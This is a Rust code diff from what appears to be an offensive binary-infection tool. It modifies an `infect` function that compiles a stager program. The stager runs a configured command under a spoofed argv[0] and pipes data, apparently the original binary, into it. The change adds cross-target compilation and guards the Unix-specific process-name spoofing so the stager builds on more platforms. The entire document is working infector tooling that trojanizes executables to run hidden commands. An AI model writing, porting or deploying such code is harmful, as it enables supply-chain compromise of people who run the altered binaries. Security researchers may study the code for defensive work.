@@ -17,7 +17,7 @@ pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
     let exec_path = config.exec_path();
     let args = config.args(exec_path);
 
-    let mut compiler = rust::Compiler::spawn(bin).await?;
+    let mut compiler = rust::Compiler::spawn(bin, config.target.as_deref()).await?;
 
     info!(
         "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
@@ -37,19 +37,19 @@ pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
     compiler
         .add_lines(&[
             "use std::io::Write;\n",
+            "#[cfg(unix)]\n",
             "use std::os::unix::process::CommandExt;\n",
             "use std::process::Command;\n",
             "use std::process::Stdio;\n",
             "use std::process::exit;\n",
             "fn main() {\n",
-            &format!(
-                "let Ok(mut child) = Command::new(\"{}\")\n",
-                exec_path_escaped
-            ),
-            &format!(".arg0(\"{}\")\n", arg0_escaped),
+            &format!("let mut cmd = Command::new(\"{}\");\n", exec_path_escaped),
+            "#[cfg(unix)]\n",
+            &format!("cmd.arg0(\"{}\");\n", arg0_escaped),
+            "cmd",
             &args_src,
-            ".stdin(Stdio::piped())\n",
-            ".spawn() else { exit(1) };\n",
+            ".stdin(Stdio::piped());\n",
+            "let Ok(mut child) = cmd.spawn() else { exit(1) };\n",
             "let Some(mut f) = child.stdin.take() else { exit(1) };\n",
         ])
         .await?;
